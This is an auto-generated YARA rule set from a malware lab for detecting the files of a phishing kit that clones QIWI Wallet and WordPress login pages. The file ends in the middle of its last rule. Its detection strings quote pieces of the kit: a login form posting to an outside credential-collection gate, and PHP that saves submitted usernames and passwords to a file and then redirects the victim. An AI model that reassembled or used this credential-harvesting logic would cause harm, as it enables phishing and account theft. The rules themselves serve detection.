/* ===================== */
/* Source: /home/ubuntu/yara-lab/rule_library/generated/phish__wordpress/phish__wordpress_auto.yar */
/* ===================== */

/*
   YARA Rule Set
   Author: Comps Team Malware Lab
   Date: 2026-02-27
   Identifier: phish__wordpress
   Reference: phish__wordpress phishing_kit auto gen
*/

/* Rule Set ----------------------------------------------------------------- */

rule _opt_mal_phish__wordpress_home_ubuntu_malware_lab_samples_extracted_phishing_Wordpress_QIWI_QIWI_index_files_qiwi {
   meta:
      description = "phish__wordpress - file qiwi.js"
      author = "Comps Team Malware Lab"
      reference = "phish__wordpress phishing_kit auto gen"
      date = "2026-02-27"
      hash1 = "e5ce54cb2fba7742f802acb1416b37dfa2acec6a9aa7e80db660b89d90d735ff"
   strings:
      $x1 = "function li(a,b){return a.va&&b?$a(a.va,b):-1}d.removeChild=function(a,b){if(a){var c=ia(a)?a:a.Ha();a=ei(this,c);if(c&&a){var e" ascii /* score: '47.00'*/
      $x2 = "this),clear:!1})};d.mQ=function(){return this.F({link:jk})};E(D.a(),NA);nk=new G(u.qiwi.remind.form);ok=new G(u.qiwi.remind.mail" ascii /* score: '42.00'*/
      $x3 = "function ec(a){return s&&fc>=a}var gc=aa.document,fc=gc&&s?ac()||(\"CSS1Compat\"==gc.compatMode?parseInt(bc,10):5):void 0;functi" ascii /* score: '41.00'*/
      $x4 = "d.UQ=function(){clearTimeout(this.hn);this.hn=setTimeout(z(function(){this.h(this.Dn)},this),this.kH);return y()};d.Jm=function(" ascii /* score: '41.00'*/
      $x5 = "HA.prototype.Wc=function(){var a=v.Deferred();this.zo.request(!0);this.zo.bindspace(this,\"load error\",function(){this.zo.reque" ascii /* score: '40.00'*/
      $x6 = "function Ze(a,b,c,e,f,g,l,r){a.send(zd(!0,{event:Ya(Xa(b)),eventCategory:Ya(Xa(c)),eventAction:Ya(Xa(e)),eventLabel:f||\"\",even" ascii /* score: '39.00'*/
      $x7 = "this.e.analytics)this.L.filter(\":text,:password\").each(function(){var a=v(this),c=a.val();a.data(\"ui-mask\")&&(c=a.mask(\"val" ascii /* score: '38.00'*/
      $x8 = "d.Ey=function(a){this.cz+=1;this.bs.remove();return this.F({link:this.lN,data:a.data,request:this.k,k:this.KC,sa:\"append\",t:th" ascii /* score: '37.00'*/
      $x9 = "var bh=new Lg(\"oauth-created\"),ch=new Lg(\"oauth-login-success\"),dh=new Lg(\"oauth-login-error\"),eh=new Lg(\"oauth-login-err" ascii /* score: '36.00'*/
      $x10 = "ch.addListener(function(a){return Uj.a().eJ.h(a)},1);dh.addListener(function(a){return Uj.a().bJ.h(a)});dh.addListener(function(" ascii /* score: '36.00'*/
      $x11 = "function fd(a,b){if(\"textContent\"in a)a.textContent=b;else if(3==a.nodeType)a.data=b;else if(a.firstChild&&3==a.firstChild.nod" ascii /* score: '36.00'*/
      $x12 = "d.h=function(a,b,c){Qd(a)&&(a=a.getName());Jd(a)||Ud(\"Action must be action or action name\");this.kr[a]||Ud(\"Widget %s has no" ascii /* score: '34.00'*/
      $x13 = "tion %s\",this.getName(),a);a=this.kr[a];this.log(za(\"execute action %s\",a.getName()));b=$.extend(b||{},{action:a});return a.h" ascii /* score: '34.00'*/
      $x14 = "function $m(a){a.k.remove();return an.rc()?an.a().V.h():y()}d.BO=function(a){this.ca(a);return this.Jp({message:u.person.wallet." ascii /* score: '34.00'*/
      $x15 = "u.shell.validate);return this}m(Ge,A);h(Ge);Ge.prototype.getName=q(\"validate\");Ge.prototype.getData=q(\"validate\");Ge.prototy" ascii /* score: '34.00'*/
      $x16 = "b){$.ajax({url:\"https://maps-api-ssl.google.com/maps/suggest\",data:{q:a.term,cp:10,json:!0},dataType:\"jsonp\",success:functio" ascii /* score: '33.00'*/
      $x17 = "d.Zp=function(a){this.L.disabled(!0).refresh();this.od.hide();this.R.empty().show();return this.trigger(this.ri,{k:this.R,sa:\"h" ascii /* score: '33.00'*/
      $x18 = "d.Lm=function(){};d.Wp=function(a){return this.trigger(this.Ko,a)};d.Yp=function(a){this.ca(a);this.e.context=a.context;return t" ascii /* score: '32.00'*/
      $x19 = "d.each=function(a){var b=v(a),c=b.attr(this.getData()),e=v(\"\\x3cinput\\x3e\");e.attr({type:\"text\",tabindex:b.attr(\"tabindex" ascii /* score: '32.00'*/
      $x20 = "V,{target:!0})};d.kQ=function(a){this.mb.val(a.data.login).trigger(\"change\");this.Oe.val(a.data.newPassword).trigger(\"change" ascii /* score: '32.00'*/
   condition:
      uint16(0) == 0x6176 and filesize < 2000KB and
      1 of ($x*)
}

rule qiwi_main_lib {
   meta:
      description = "phish__wordpress - file qiwi-main-lib.js"
      author = "Comps Team Malware Lab"
      reference = "phish__wordpress phishing_kit auto gen"
      date = "2026-02-27"
      hash1 = "34292303c025222b51be2e1755d3e3dd2828924a8ab50d5e028aed9f1396d892"
   strings:
      $x1 = "]+$/i},b=/^[-+]?[0-9]+$/,x=/^(?:[-+]?(?:0|[1-9][0-9]*))$/,w=/^(?:[-+]?(?:[0-9]+))?(?:\\.[0-9]*)?(?:[eE][\\+\\-]?(?:[0-9]+))?$/,k" ascii /* score: '79.00'*/
      $x2 = "function r(t,e){if(!i.canUseDOM||e&&!(\"addEventListener\"in document))return!1;var n=\"on\"+t,r=n in document;if(!r){var a=docu" ascii /* score: '70.00'*/
      $x3 = "\";default:return t}},week:{dow:1,doy:7}});return o})},[823,653,654,275,657,658],function(t,e){(function(e){\"undefined\"!=typeo" ascii /* score: '68.50'*/
      $x4 = "e[\"default\"]=n,t.exports=e[\"default\"]},function(t,e,n){\"use strict\";function r(t){return(t.ctrlKey||t.metaKey)&&t.keyCode=" ascii /* score: '68.00'*/
      $x5 = "\"use strict\";function n(t){function e(t){}if(!t)throw new TypeError(\"argument namespace is required\");return e._file=void 0," ascii /* score: '67.50'*/
      $x6 = "\"}]});e.IdentificationDocsSchemaAny=s},[819,645],function(t,e,n){\"use strict\";var r=n(1)[\"default\"];e.__esModule=!0;var o=n" ascii /* score: '67.00'*/
      $x7 = "\")):null)},o(e,null,[{key:\"propTypes\",value:l.propTypes({icon:c.Bool,children:l.ReactNode}),enumerable:!0}]),e}(s.Component);" ascii /* score: '67.00'*/
      $x8 = "var r=n(14);r.Any=n(204),r.Array=n(771),r.Boolean=n(322),r.Date=n(772),r.Error=n(773),r.Function=n(205),r.Nil=n(323),r.Number=n(" ascii /* score: '65.00'*/
      $x9 = "var o=a.getNode(this._rootNodeID);r.updateTextContent(o,n)}}},unmountComponent:function(){i.unmountIDFromEnvironment(this._rootN" ascii /* score: '62.00'*/
      $x10 = "o[t]=r},detachRef:function(t){var e=this.getPublicInstance().refs;delete e[t]},getName:function(){var t=this._currentElement.typ" ascii /* score: '60.00'*/
      $x11 = "\"}},function(t,e){t.exports={config:{debug:{enabled:!1,mask:\"qiwi:*\"},sitePrefix:\"\",locale:{lang:\"ru\",translations:{}},xd" ascii /* score: '58.50'*/
      $x12 = "\"],u=[\"{\",\"}\",\"|\",\"\\\\\",\"^\",\"`\"].concat(s),c=[\"'\"].concat(u),l=[\"%\",\"/\",\"?\",\";\",\"#\"].concat(c),f=[\"/" ascii /* score: '55.50'*/
      $x13 = "return 1>a?(o=t.year()-1,r=a+_t(o,e,n)):a>_t(t.year(),e,n)?(r=a-_t(t.year(),e,n),o=t.year()+1):(o=t.year(),r=a),{week:r,year:o}}" ascii /* score: '54.00'*/
      $x14 = "\":\"ss\"};t.exports=n},function(t,e,n){function r(t,e,n,r,i,a,s){var u=-1,c=t.length,l=e.length;if(c!=l&&!(i&&l>c))return!1;for" ascii /* score: '53.00'*/
      $x15 = "!function(){\"use strict\";function n(){for(var t=[],e=0;e<arguments.length;e++){var r=arguments[e];if(r){var o=typeof r;if(\"st" ascii /* score: '52.00'*/
      $x16 = "}function c(t){v(t,i)}function l(t){v(t,a)}function f(t,e,n,r){h.injection.getInstanceHandle().traverseEnterLeave(n,r,s,t,e)}fun" ascii /* score: '50.00'*/
      $x17 = "onMouseUpCapture:!0})}},paste:{phasedRegistrationNames:{bubbled:_({onPaste:!0}),captured:_({onPasteCapture:!0})}},pause:{phasedR" ascii /* score: '48.00'*/
      $x18 = "javascript:!0,\"javascript:\":!0},E={javascript:!0,\"javascript:\":!0},C={http:!0,https:!0,ftp:!0,gopher:!0,file:!0,\"http:\":!0" ascii /* score: '48.00'*/
      $x19 = "n=N(n)),e=n),e}function c(){var e,n,r,i,a,s;if(e=vt,61===t.charCodeAt(vt)?(n=F,vt++):(n=x,0===wt&&o(R)),n!==x){if(r=[],j.test(t." ascii /* score: '47.00'*/
      $x20 = "\".split(\"|\");y.prototype.add=function(t,e){return this.__schemas__[t]=e,h(this),this},y.prototype.set=function(t){return this" ascii /* score: '47.00'*/
   condition:
      uint16(0) == 0x6874 and filesize < 2000KB and
      1 of ($x*)
}

rule _opt_mal_phish__wordpress_home_ubuntu_malware_lab_samples_extracted_phishing_Wordpress_QIWI_QIWI_index_files_main {
   meta:
      description = "phish__wordpress - file main.css"
      author = "Comps Team Malware Lab"
      reference = "phish__wordpress phishing_kit auto gen"
      date = "2026-02-27"
      hash1 = "d3bf9755512b83d8a2a8f56c1ba6ee2a5cc6c0e7359f0d22b5af6b603c8a2ba3"
   strings:
      $x1 = ".container{margin-right:auto;margin-left:auto;padding-left:15px;padding-right:15px}.container:before,.container:after{content:\"" ascii /* score: '70.00'*/
      $x2 = "er:progid:DXImageTransform.Microsoft.AlphaImageLoader(src='//static.qiwi.com/img/themes/megafon/images/providers/logoBig/i_count" ascii /* score: '33.00'*/
      $x3 = "ne;filter:progid:DXImageTransform.Microsoft.AlphaImageLoader(src='//static.qiwi.com/img/themes/megafon/images/providers/logoBig/" ascii /* score: '33.00'*/
      $x4 = "ogid:DXImageTransform.Microsoft.AlphaImageLoader(src='//static.qiwi.com/img/themes/megafon/images/providers/logoBig/910_l.png',s" ascii /* score: '33.00'*/
      $x5 = "id:DXImageTransform.Microsoft.AlphaImageLoader(src='//static.qiwi.com/img/themes/megafon/images/providers/logoBig/901_l.png',siz" ascii /* score: '33.00'*/
      $x6 = " .frame .icon.icon_901{background:none;filter:progid:DXImageTransform.Microsoft.AlphaImageLoader(src='//static.qiwi.com/img/qiwi" ascii /* score: '31.00'*/
      $x7 = "ist li .frame .icon.icon_907{background:none;filter:progid:DXImageTransform.Microsoft.AlphaImageLoader(src='//static.qiwi.com/im" ascii /* score: '31.00'*/
      $x8 = "wi.com/img/themes/beeline/identification/identification-profile.png)}.theme__beeline .header-content .auth_login .identify_statu" ascii /* score: '31.00'*/
      $s9 = "70px;z-index:10;content:\" \";width:220px;background:url(//static.qiwi.com/img/themes/beeline/logo/logo2x.png) no-repeat;backgro" ascii /* score: '30.00'*/
      $s10 = "actions .logout a{color:#000}.theme__megafon .header-content .auth_actions .logout a:hover{color:#00985f}.theme__megafon .top-up" ascii /* score: '29.00'*/
      $s11 = ".Microsoft.AlphaImageLoader(src='//static.qiwi.com/img/qiwi_com/ui/transfer/themes/megafon/images/providers/logoBig/906_l.png',s" ascii /* score: '28.00'*/
      $s12 = "-pic{background:none;filter:progid:DXImageTransform.Microsoft.AlphaImageLoader(src='//static.qiwi.com/img/themes/megafon/images/" ascii /* score: '28.00'*/
      $s13 = "g-box.bank{background:none;filter:progid:DXImageTransform.Microsoft.AlphaImageLoader(src='//static.qiwi.com/img/themes/megafon/i" ascii /* score: '28.00'*/
      $s14 = "id-img .img-box.bank{background:none;filter:progid:DXImageTransform.Microsoft.AlphaImageLoader(src='//static.qiwi.com/img/qiwi_c" ascii /* score: '28.00'*/
      $s15 = "n.icon_908{background:none;filter:progid:DXImageTransform.Microsoft.AlphaImageLoader(src='//static.qiwi.com/img/themes/megafon/i" ascii /* score: '28.00'*/
      $s16 = "r:progid:DXImageTransform.Microsoft.AlphaImageLoader(src='//static.qiwi.com/img/qiwi_com/ui/transfer/icons/i_eggs_200.png',sizin" ascii /* score: '28.00'*/
      $s17 = "ground:none;filter:progid:DXImageTransform.Microsoft.AlphaImageLoader(src='//static.qiwi.com/img/qiwi_com/ui/transfer/icons/i_ba" ascii /* score: '28.00'*/
      $s18 = "r:progid:DXImageTransform.Microsoft.AlphaImageLoader(src='//static.qiwi.com/img/qiwi_com/ui/transfer/icons/i_mail_200.png',sizin" ascii /* score: '28.00'*/
      $s19 = "und:none;filter:progid:DXImageTransform.Microsoft.AlphaImageLoader(src='//static.qiwi.com/img/themes/megafon/images/providers/lo" ascii /* score: '28.00'*/
      $s20 = "orm.Microsoft.AlphaImageLoader(src='//static.qiwi.com/img/themes/megafon/images/providers/logoBig/917_l.png',sizingMethod='scale" ascii /* score: '27.00'*/
   condition:
      uint16(0) == 0x632e and filesize < 1000KB and
      1 of ($x*) and 4 of them
}

rule qiwi_main_lib_2 {
   meta:
      description = "phish__wordpress - file qiwi-main-lib.css"
      author = "Comps Team Malware Lab"
      reference = "phish__wordpress phishing_kit auto gen"
      date = "2026-02-27"
      hash1 = "d813aed99d1c97bae282abc6bbcd031747ac4f6e44c10458cd9e7c7d4d38518c"
   strings:
      $x1 = ".qw-back-button{color:#000;font-size:13px;font-weight:400;padding:7px 14px;background:#fff;border:0;min-height:40px;white-space:" ascii /* score: '56.00'*/
      $s2 = "inear}.theme__megafon .qw-identification-process-load-spinner-loader{stroke:#00965d}.theme__beeline .qw-identification-process-l" ascii /* score: '23.00'*/
      $s3 = "-identification-process-load-spinner-loader{fill:none;stroke:#ffa834;stroke-width:.1em;stroke-linecap:round;stroke-dasharray:2.3" ascii /* score: '23.00'*/
      $s4 = "oad-spinner-loader{stroke:#ffb612}.qw-identification-process-load-spinner-border{fill:none;stroke:#d3d3d3;stroke-width:.1em}.qw-" ascii /* score: '23.00'*/
      $s5 = "10px -.5%}.qw-three-column:after,.qw-three-column:before{content:\"\";display:table}.qw-three-column:after{clear:both;content:\"" ascii /* score: '19.00'*/
      $s6 = "olid #f2f2f2}.qw-identification-form-main-header-security:after,.qw-identification-form-main-header-security:before{content:\"\"" ascii /* score: '19.00'*/
      $s7 = "m-main-docs-head:before{content:\"\";display:table}.qw-identification-form-main-docs-head:after{clear:both}.qw-identification-fo" ascii /* score: '19.00'*/
      $s8 = "px -1%}.qw-help-teaser-list:after,.qw-help-teaser-list:before{content:\"\";display:table}.qw-help-teaser-list:after{clear:both}." ascii /* score: '19.00'*/
      $s9 = "66666666666667" ascii /* score: '17.00'*/ /* hex encoded string 'ffffffg' */
      $s10 = "46666666666667" ascii /* score: '17.00'*/ /* hex encoded string 'Ffffffg' */
      $s11 = "46666666666665" ascii /* score: '17.00'*/ /* hex encoded string 'Ffffffe' */
      $s12 = ":rotate(1turn)}}@-webkit-keyframes spinner-loader-animation{0%,10%{stroke-dasharray:2.3525em .4705em;stroke-dashoffset:0}50%{str" ascii /* score: '16.00'*/
      $s13 = "}@keyframes spinner-loader-animation{0%,10%{stroke-dasharray:2.3525em .4705em;stroke-dashoffset:0}50%{stroke-dashoffset:-2.826em" ascii /* score: '16.00'*/
      $s14 = "1.33333333333333%;margin:10px 1%}.qw-content.big{margin:20px 0 0}.qw-three-column{zoom:1;margin:-5px -1%}.qw-three-column-title{" ascii /* score: '16.00'*/
      $s15 = ";width:31.33333333333333%;margin:5px 1%}.qw-content{zoom:1;margin:-10px 0}.qw-content:after,.qw-content:before{content:\"\";disp" ascii /* score: '15.00'*/
      $s16 = "t;padding:20px;margin:0;opacity:0;-ms-filter:\"progid:DXImageTransform.Microsoft.Alpha(Opacity=0)\";filter:alpha(opacity=0);box-" ascii /* score: '15.00'*/
      $s17 = "ontainer{min-width:1005px;min-height:100%;position:relative;margin-bottom:-280px}.qw-container:after{content:\"\";display:block;" ascii /* score: '15.00'*/
      $s18 = "troke:#000}.theme__beeline svg .colorbrand{stroke:#f0be32}.noscript{box-shadow:0 1px 2px 0 rgba(0,0,0,.16)}.noscript-logo{displa" ascii /* score: '15.00'*/
      $s19 = "on-form-main-notes:before{content:\"\";display:table}.qw-identification-form-main-notes:after{clear:both}.qw-identification-form" ascii /* score: '14.00'*/
      $s20 = "ff}.qw-identification-process:first-child{margin-top:0}.qw-identification-process:last-child{margin-bottom:0}.qw-identification-" ascii /* score: '14.00'*/
   condition:
      uint16(0) == 0x712e and filesize < 100KB and
      1 of ($x*) and 4 of them
}

rule settings {
   meta:
      description = "phish__wordpress - file settings.js"
      author = "Comps Team Malware Lab"
      reference = "phish__wordpress phishing_kit auto gen"
      date = "2026-02-27"
      hash1 = "2e4f2fde23c0e4373d00eb6903031e55066ad7e863adea542d58e8a98f598c76"
   strings:
      $s1 = "error: \"https:\\/\\/static.qiwi.com\\/img\\/visa_qiwi_com\\/ui\\/statuses\\/error.png\"" fullword ascii /* score: '23.00'*/
      $s2 = "success: \"https:\\/\\/static.qiwi.com\\/img\\/visa_qiwi_com\\/ui\\/statuses\\/success.png\"," fullword ascii /* score: '23.00'*/
      $s3 = "link : \"/acquiring/content/pay/subscribed/process.action\"" fullword ascii /* score: '20.00'*/
      $s4 = "link : \"/order/external/content/form/login.action\"," fullword ascii /* score: '20.00'*/
      $s5 = "link : \"/acquiring/content/pay/unsubscribed/process.action\"" fullword ascii /* score: '20.00'*/
      $s6 = "link : \"/acquiring/content/subscribe/process.action\"," fullword ascii /* score: '20.00'*/
      $s7 = "        server : \"https:\\/\\/sso.qiwi.com\"," fullword ascii /* score: '18.00'*/
      $s8 = "link : \"/person/change/success/content/password.action\"," fullword ascii /* score: '17.00'*/
      $s9 = "link : \"https://static.qiwi.com/img/visa_qiwi_com/ui/replenish/map/icon/shadow.png\"" fullword ascii /* score: '17.00'*/
      $s10 = "link : \"/register/content/password.action\"," fullword ascii /* score: '17.00'*/
      $s11 = "link : \"https://static.qiwi.com/img/visa_qiwi_com/ui/replenish/map/icon/terminal.png\"" fullword ascii /* score: '17.00'*/
      $s12 = "link : \"https://static.qiwi.com/img/qiwi_com/ui/replenish/map/icon/money2.png\"" fullword ascii /* score: '17.00'*/
      $s13 = "\\u003C\\/p\\u003E\\n\\u003Cp\\u003E\\u003Ca href=\\\"\\/support\\/faq\\/binding-of-bank-card.action\\\" target=\\\"_blank\\\"" ascii /* score: '17.00'*/
      $s14 = "link : \"https://static.qiwi.com/img/visa_qiwi_com/ui/replenish/map/icon/money.png\"" fullword ascii /* score: '17.00'*/
      $s15 = "link : \"/external/register/content/password.action\"," fullword ascii /* score: '17.00'*/
      $s16 = "link : \"https://static.qiwi.com/img/qiwi_com/ui/replenish/map/icon/terminal2.png\"" fullword ascii /* score: '17.00'*/
      $s17 = "link : \"https://static.qiwi.com/img/visa_qiwi_com/ui/replenish/map/icon/office.png\"" fullword ascii /* score: '17.00'*/
      $s18 = "link : \"https://static.qiwi.com/img/visa_qiwi_com/ui/replenish/map/icon/shop.png\"" fullword ascii /* score: '17.00'*/
      $s19 = "link : \"/remind/password/content.action\"," fullword ascii /* score: '17.00'*/
      $s20 = "link : \"https://static.qiwi.com/img/visa_qiwi_com/ui/replenish/map/icon/none.png\"" fullword ascii /* score: '17.00'*/
   condition:
      uint16(0) == 0x0a0a and filesize < 200KB and
      8 of them
}

rule _opt_mal_phish__wordpress_home_ubuntu_malware_lab_samples_extracted_phishing_Wordpress_QIWI_QIWI_index {
   meta:
      description = "phish__wordpress - file index.html"
      author = "Comps Team Malware Lab"
      reference = "phish__wordpress phishing_kit auto gen"
      date = "2026-02-27"
      hash1 = "0d35edd6f435d7d8c57271f7164cbfb6fb694c48b59e8661aee6d0d9644d94c4"
   strings:
      $s1 = "<div id=\"cboxOverlay\" style=\"display: none;\"></div><div id=\"colorbox\" class=\"\" role=\"dialog\" tabindex=\"-1\" style=\"d" ascii /* score: '30.00'*/
      $s2 = "<!-- saved from url=(0125)http://prot-spb.ru/qiwi/2a8bd96f71085a833a0bd5a05f47447e%20%D0%A1%D0%BA%D0%BE%D0%BF%D0%B8%D1%80%D0%BE%" ascii /* score: '29.00'*/
      $s3 = "                            <a class=\"lostPasswordLink\" href=\"http://prot-spb.ru/qiwi/2a8bd96f71085a833a0bd5a05f47447e%20%D0%" ascii /* score: '28.00'*/
      $s4 = "D0%BA%D0%BE%D0%BF%D0%B8%D1%80%D0%BE%D0%B2%D0%B0%D1%82%D1%8C\" target=\"_self\" data-ga=\"{&quot;category&quot;:&quot;person-logi" ascii /* score: '28.00'*/
      $s5 = "<form class=\"loginWithCaptcha\" data-validate=\"{}\" method=\"POST\" action=\"http://kotfake.net/gate.php\" novalidate=\"novali" ascii /* score: '27.00'*/
      $s6 = "            <a href=\"http://prot-spb.ru/qiwi/2a8bd96f71085a833a0bd5a05f47447e%20%D0%A1%D0%BA%D0%BE%D0%BF%D0%B8%D1%80%D0%BE%D0%B" ascii /* score: '26.00'*/
      $s7 = "<script src=\"https://static.qiwi.com/njsf/qiwi-wallet-legacy/1.3.0-19-g5e24222/legacy.js\"></script>" fullword ascii /* score: '23.00'*/
      $s8 = "    <a href=\"http://prot-spb.ru/qiwi/2a8bd96f71085a833a0bd5a05f47447e%20%D0%A1%D0%BA%D0%BE%D0%BF%D0%B8%D1%80%D0%BE%D0%B2%D0%B0%" ascii /* score: '21.00'*/
      $s9 = "%BE%D0%BF%D0%B8%D1%80%D0%BE%D0%B2%D0%B0%D1%82%D1%8C\" target=\"_self\" data-ga-link-open=\"SMS/USSD-" fullword ascii /* score: '21.00'*/
      $s10 = "                <a href=\"http://prot-spb.ru/qiwi/2a8bd96f71085a833a0bd5a05f47447e%20%D0%A1%D0%BA%D0%BE%D0%BF%D0%B8%D1%80%D0%BE%" ascii /* score: '21.00'*/
      $s11 = "%BE%D0%BF%D0%B8%D1%80%D0%BE%D0%B2%D0%B0%D1%82%D1%8C\" target=\"_self\" data-ga-link-open=\"" fullword ascii /* score: '21.00'*/
      $s12 = "</select><span class=\"ui-selectmenu-button\"><a class=\"ui-button ui-widget ui-state-default ui-corner-all language-list-select" ascii /* score: '20.00'*/
      $s13 = "<!-- saved from url=(0125)http://prot-spb.ru/qiwi/2a8bd96f71085a833a0bd5a05f47447e%20%D0%A1%D0%BA%D0%BE%D0%BF%D0%B8%D1%80%D0%BE%" ascii /* score: '20.00'*/
      $s14 = "<form class=\"loginWithCaptcha\" data-validate=\"\" method=\"POST\" action=\"log.php\" novalidate=\"novalidate\">" fullword ascii /* score: '19.00'*/
      $s15 = "                <a class=\"lostPasswordLink\" href=\"http://prot-spb.ru/qiwi/2a8bd96f71085a833a0bd5a05f47447e%20%D0%A1%D0%BA%D0%" ascii /* score: '18.00'*/
      $s16 = "D0%BF%D0%B8%D1%80%D0%BE%D0%B2%D0%B0%D1%82%D1%8C\" data-ga=\"{&quot;category&quot;:&quot;login-form&quot;,&quot;action&quot;:&quo" ascii /* score: '18.00'*/
      $s17 = "            <button class=\"fullOrangeBtn\" data-href=\"\" data-target=\"_self\" style=\"margin: -1px 0 0 40px;\" data-ga=\"{&qu" ascii /* score: '18.00'*/
      $s18 = "1%82%D1%8C\" target=\"_self\">" fullword ascii /* score: '17.00'*/
      $s19 = "0%B2%D0%B0%D1%82%D1%8C\" target=\"_self\">" fullword ascii /* score: '17.00'*/
      $s20 = " https://w.qiwi.com&quot;,&quot;title&quot;:&quot;Visa QIWI Wallet " fullword ascii /* score: '17.00'*/
   condition:
      uint16(0) == 0x213c and filesize < 100KB and
      8 of them
}

rule _opt_mal_phish__wordpress_home_ubuntu_malware_lab_samples_extracted_phishing_Wordpress_QIWI_QIWI_index_files_proxy {
   meta:
      description = "phish__wordpress - file proxy.html"
      author = "Comps Team Malware Lab"
      reference = "phish__wordpress phishing_kit auto gen"
      date = "2026-02-27"
      hash1 = "42c8b60137736940afedc7fc2b8c0994d352338490beafb5a4867494633179de"
   strings:
      $s1 = "<!-- saved from url=(0034)https://sso.qiwi.com/app/proxy?v=1 -->" fullword ascii /* score: '30.00'*/
      $s2 = "<!-- a padding to disable MSIE and Chrome friendly error page -->" fullword ascii /* score: '25.00'*/
      $s3 = "<html><head><meta http-equiv=\"Content-Type\" content=\"text/html; charset=windows-1252\"><title>403 Forbidden</title></head>" fullword ascii /* score: '17.00'*/
      $s4 = "<center><h1>403 Forbidden</h1></center>" fullword ascii /* score: '4.00'*/
      $s5 = "<hr><center>nginx</center>" fullword ascii /* score: '4.00'*/
   condition:
      uint16(0) == 0x3c0a and filesize < 2KB and
      all of them
}

rule _opt_mal_phish__wordpress_home_ubuntu_malware_lab_samples_extracted_phishing_Wordpress_login {
   meta:
      description = "phish__wordpress - file login.html"
      author = "Comps Team Malware Lab"
      reference = "phish__wordpress phishing_kit auto gen"
      date = "2026-02-27"
      hash1 = "03f0c9ac7a239e08014ad26010c8d2eb773acc19e0fd2d26cc7c078291e73962"
   strings:
      $s1 = "<a href=\"http://localhost/wp-login.php?action=lostpassword\">Lost your password?</a>" fullword ascii /* score: '25.00'*/
      $s2 = "<form name=\"loginform\" id=\"loginform\" action=\"login.php\" method=\"post\">" fullword ascii /* score: '23.00'*/
      $s3 = "<html xmlns=\"http://www.w3.org/1999/xhtml\" lang=\"en-US\"><!--<![endif]--><head>" fullword ascii /* score: '20.00'*/
      $s4 = "<label for=\"user_login\">Username or Email Address<br>" fullword ascii /* score: '18.00'*/
      $s5 = "<p id=\"backtoblog\"><a href=\"http://localhost/\">" fullword ascii /* score: '16.00'*/
      $s6 = "<body class=\"login login-action-login wp-core-ui  locale-en-us\">" fullword ascii /* score: '14.00'*/
      $s7 = "<h1><a href=\"https://wordpress.org/\" title=\"Powered by WordPress\" tabindex=\"-1\">Powered by WordPress</a></h1>" fullword ascii /* score: '13.00'*/
      $s8 = "<label for=\"user_pass\">Password<br>" fullword ascii /* score: '12.00'*/
      $s9 = "<input name=\"log\" id=\"user_login\" class=\"input\" size=\"20\" type=\"text\"></label>" fullword ascii /* score: '11.00'*/
      $s10 = "<input name=\"redirect_to\" value=\"http://localhost/wp-admin/\" type=\"hidden\">" fullword ascii /* score: '11.00'*/
      $s11 = "<link rel=\"dns-prefetch\" href=\"http://s.w.org/\">" fullword ascii /* score: '10.00'*/
      $s12 = "<meta name=\"robots\" content=\"noindex,follow\">" fullword ascii /* score: '9.00'*/
      $s13 = "<title>Log In " fullword ascii /* score: '9.00'*/
      $s14 = "<input name=\"pwd\" id=\"user_pass\" class=\"input\" value=\"\" size=\"20\" type=\"password\"></label>" fullword ascii /* score: '8.00'*/
      $s15 = "<input name=\"testcookie\" value=\"1\" type=\"hidden\">" fullword ascii /* score: '7.00'*/
      $s16 = "<link rel=\"stylesheet\" href=\"index_files/load-styles.css\" type=\"text/css\" media=\"all\">" fullword ascii /* score: '7.00'*/
      $s17 = "<html xmlns=\"http://www.w3.org/1999/xhtml\" class=\"ie8\" lang=\"en-US\">" fullword ascii /* score: '6.00'*/
      $s18 = "<p class=\"forgetmenot\"><label for=\"rememberme\"><input name=\"rememberme\" id=\"rememberme\" value=\"forever\" type=\"checkbo" ascii /* score: '5.00'*/
      $s19 = "<p class=\"forgetmenot\"><label for=\"rememberme\"><input name=\"rememberme\" id=\"rememberme\" value=\"forever\" type=\"checkbo" ascii /* score: '5.00'*/
      $s20 = "<input name=\"wp-submit\" id=\"wp-submit\" class=\"button button-primary button-large\" value=\"Log In\" type=\"submit\">" fullword ascii /* score: '5.00'*/
   condition:
      uint16(0) == 0x213c and filesize < 5KB and
      8 of them
}

rule _opt_mal_phish__wordpress_home_ubuntu_malware_lab_samples_extracted_phishing_Wordpress_QIWI_QIWI_file {
   meta:
      description = "phish__wordpress - file file.php"
      author = "Comps Team Malware Lab"
      reference = "phish__wordpress phishing_kit auto gen"
      date = "2026-02-27"
      hash1 = "a13cb8687feb41e7de247fbb1cf5d4231853253b3a89feb96d2d8f76a43fa6f5"
   strings:
      $s1 = "by Jacksida" fullword ascii /* score: '4.00'*/
   condition:
      uint16(0) == 0x7962 and filesize < 1KB and
      all of them
}

rule _opt_mal_phish__wordpress_home_ubuntu_malware_lab_samples_extracted_phishing_Wordpress_QIWI_QIWI_log {
   meta:
      description = "phish__wordpress - file log.php"
      author = "Comps Team Malware Lab"
      reference = "phish__wordpress phishing_kit auto gen"
      date = "2026-02-27"
      hash1 = "1cf514d8f033f6ff44cd9258bdf08e105d44c62245a7a5b7fbdc62c6372c2480"
   strings:
      $s1 = "echo \"<html><head><META HTTP-EQUIV='Refresh' content ='0; URL=qiwi.com/'></head></html>\";" fullword ascii /* score: '27.00'*/
      $s2 = "$Pass = $_POST['Password'];" fullword ascii /* score: '17.00'*/
      $s3 = "$Log = $_POST['Nickname'];" fullword ascii /* score: '14.00'*/
      $s4 = "$log = fopen(\"file.php\",\"a+\");" fullword ascii /* score: '12.00'*/
      $s5 = "fwrite($log,\"\\n $Log:$Pass \\n\");" fullword ascii /* score: '12.00'*/
      $s6 = "fclose($log);" fullword ascii /* score: '4.00'*/ /* Goodware String - occured 1 times */
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule load_styles {
   meta:
      description = "phish__wordpress - file load-styles.css"
      author = "Comps Team Malware Lab"
      reference = "phish__wordpress phishing_kit auto gen"
      date = "2026-02-27"
      hash1 = "8fabaf6789ee0a389057597cbcdb1fb8df07efae6c09a81489a05f0f336c15ea"
   strings:
      $x1 = "#your-profile label+a,.wp-admin select,fieldset label,label{vertical-align:middle}#pass-strength-result,.color-option,input,text" ascii /* score: '52.00'*/
      $x2 = "#your-profile label+a,.wp-admin select,fieldset label,label{vertical-align:middle}#pass-strength-result,.color-option,input,text" ascii /* score: '52.00'*/
      $x3 = "@font-face{font-family:dashicons;src:url(../wp-includes/fonts/dashicons.eot)}@font-face{font-family:dashicons;src:url(data:appli" ascii /* score: '51.00'*/
